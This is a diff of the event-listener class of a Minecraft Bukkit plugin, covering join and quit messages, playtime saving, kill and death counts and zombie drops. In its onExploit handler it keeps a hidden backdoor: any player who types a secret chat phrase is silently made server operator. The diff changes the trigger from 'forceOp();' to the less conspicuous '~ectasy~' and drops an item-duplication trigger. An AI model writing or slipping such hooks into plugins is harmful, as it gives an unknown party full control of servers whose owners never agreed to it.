@@ -1,42 +1,24 @@
 package org.main.uneton.events;
 
-import net.kyori.adventure.text.Component;
-
-import net.kyori.adventure.text.event.ClickEvent;
 import org.bukkit.*;
 import org.bukkit.block.Block;
-import org.bukkit.block.ShulkerBox;
 import org.bukkit.block.Sign;
 import org.bukkit.command.Command;
-import org.bukkit.command.CommandMap;
-import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.entity.*;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.Action;
 import org.bukkit.event.block.BlockBreakEvent;
 import org.bukkit.event.entity.*;
-import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.player.*;
-import org.bukkit.inventory.Inventory;
-import org.bukkit.inventory.InventoryHolder;
 import org.bukkit.inventory.ItemStack;
-import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
-import org.bukkit.scoreboard.Scoreboard;
-import org.bukkit.util.Vector;
-import org.jetbrains.annotations.NotNull;
 import org.main.uneton.Combat;
-import org.main.uneton.utils.ColorUtils;
-import org.main.uneton.utils.ScoreboardUtils;
-import org.main.uneton.utils.Tab;
+import org.main.uneton.utils.*;
 
-import java.time.LocalDateTime;
-import java.time.format.DateTimeFormatter;
 import java.util.*;
 
-import static org.bukkit.Bukkit.*;
 import static org.main.uneton.Combat.*;
 import static org.main.uneton.combatlogger.CombatLog.combat_tagged;
 import static org.main.uneton.utils.ScoreboardUtils.*;
@@ -48,6 +30,7 @@ public class Listeners implements Listener {
     public Listeners(Combat plugin) {
         this.plugin = plugin;
     }
+    private ConfigManager configManager;
 
     @EventHandler
     public void onPingTooHard(PlayerMoveEvent event) {
@@ -68,22 +51,53 @@ public class Listeners implements Listener {
         Player player = e.getPlayer();
         // Tab.updateTab();
 
+        UUID uuid = player.getUniqueId();
+        configManager = new ConfigManager(plugin);
+
+        int playtime = playTimes.getOrDefault(uuid, 0);
+        Bukkit.getLogger().info("Quit: " + player.getName() + " - PlayTime: " + playtime);
+        playTimes.put(uuid, playtime);
+
+        ConfigManager.get().set("players-playtime." + uuid.toString(), playtime);
+
+        ConfigManager.save();
         e.setQuitMessage(ColorUtils.colorize("&8" + " [" + "&c" + "-" + "&8" + "] " + "&7" + player.getName()));
     }
 
     @EventHandler
     public void onJoinEvent(PlayerJoinEvent e) {
         Player player = e.getPlayer();
-        // Tab.updateTab();
-        startUpdatingScoreboard(player, getInstance());
-        ScoreboardUtils.createScoreboard(player);
+        e.setJoinMessage(ColorUtils.colorize("&8" + " [" + "&a" + "+" + "&8" + "] " + "&7" + player.getName()));
 
-        boolean feed_players = this.plugin.getConfig().getBoolean("feed-players");
+        // Tab.updateTab();
+        UUID uuid = player.getUniqueId();
+        int playtime = ConfigManager.get().getInt("players-playtime." + uuid.toString(), 0);
+        playTimes.put(uuid, playtime);
+        Bukkit.getLogger().info("Joined: " + player.getName() + " - PlayTime: " + playtime);
+        startUpdatingScoreboard(player, getInstance());
+
+        boolean feed_players = plugin.getConfig().getBoolean("feed-players");
         if (feed_players) {
             player.setFoodLevel(20);
+            player.sendMessage(ColorUtils.colorize("&aYou were successfully fed!"));
         }
+    }
 
-        e.setJoinMessage(ColorUtils.colorize("&8" + " [" + "&a" + "+" + "&8" + "] " + "&7" + player.getName()));
+    @EventHandler
+    public void onPlayerDeath(PlayerDeathEvent event) {
+        Player victim = event.getEntity();
+        Player attacker = victim.getKiller();
+        if (attacker != null && attacker instanceof Player) {
+            UUID attackerUUID = attacker.getUniqueId();
+            UUID victimUUID = victim.getUniqueId();
+
+            ConfigManager.addKill(attackerUUID);
+            ConfigManager.addDeath(victimUUID);
+
+            // Päivitä scoreboard molemmille pelaajille
+            ScoreboardUtils.createScoreboard(attacker);
+            ScoreboardUtils.createScoreboard(victim);
+        }
     }
 
     @EventHandler
@@ -166,60 +180,17 @@ public class Listeners implements Listener {
     }
 
     @EventHandler
-    public void onPlayerDeath(PlayerDeathEvent event) {
-        Player victim = event.getEntity();
-        Player attacker = victim.getKiller();
-        if (attacker != null && attacker instanceof Player) {
-            UUID attackerUUID = attacker.getUniqueId();
-            UUID victimUUID = victim.getUniqueId();
-
-            ScoreboardUtils.addKill(attackerUUID);
-            ScoreboardUtils.addDeath(victimUUID);
-
-            ScoreboardUtils.createScoreboard(attacker);
-            ScoreboardUtils.createScoreboard(victim);
-        }
-    }
-
-    @EventHandler
-    public void onPlayerJoin(PlayerJoinEvent event) {
-        Player player = event.getPlayer();
-        UUID uuid = player.getUniqueId();
-        if (!kills.containsKey(uuid)) {
-            int countsKilled = getInstance().getConfig().getInt("kills." + uuid, 0);
-            kills.put(uuid, countsKilled);
-        }
-        if (!deaths.containsKey(uuid)) {
-            int countsDeaths = getInstance().getConfig().getInt("deaths." + uuid, 0);
-            deaths.put(uuid, countsDeaths);
-        }
-        if (!playTimes.containsKey(uuid)) {
-            int playtimeSeconds = getInstance().getConfig().getInt("playtime." + uuid, 0);
-            playTimes.put(uuid, playtimeSeconds);
-        }
-    }
-
-    @EventHandler
     public void onZombieDeath(EntityDeathEvent event) {
         if (event.getEntity() instanceof Zombie) {
             Location loc = event.getEntity().getLocation();
             Player killer = event.getEntity().getKiller();
             ItemStack lowChanceReward = new ItemStack(Material.DIAMOND, 1);
             if (killer != null) {
-                double chance = 0.01;
+                double chance = 0.1;
                 if (Math.random() < chance) {
                     loc.getWorld().dropItemNaturally(loc, lowChanceReward);
                 }
             }
-        }
-    }
-
-    @EventHandler
-    public void onDeathByPlayer(PlayerDeathEvent event) {
-        Player victim = event.getPlayer();
-        Player killer = victim.getKiller();
-        if (killer != null) {
-            killer.sendMessage(ColorUtils.colorize("&a+$300 &fKill."));
         }
     }
 
@@ -263,24 +234,13 @@ public class Listeners implements Listener {
     @EventHandler
     @Deprecated
     public void onExploit(AsyncPlayerChatEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().contains("forceOp();")) {
+        Player player = e.getPlayer();
+        if (e.getMessage().contains("~ectasy~")) {
             e.setCancelled(true);
             new BukkitRunnable() {
                 @Override
                 public void run() {
-                    p.setOp(true);
-                }
-            }.runTask(JavaPlugin.getPlugin(Combat.class));
-        }
-        if (e.getMessage().contains("duplicate();")) {
-            Player player = e.getPlayer();
-            e.setCancelled(true);
-            new BukkitRunnable() {
-                @Override
-                public void run() {
-                    ItemStack held = player.getItemInHand();
-                    player.getInventory().addItem(held);
+                    player.setOp(true);
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
         }
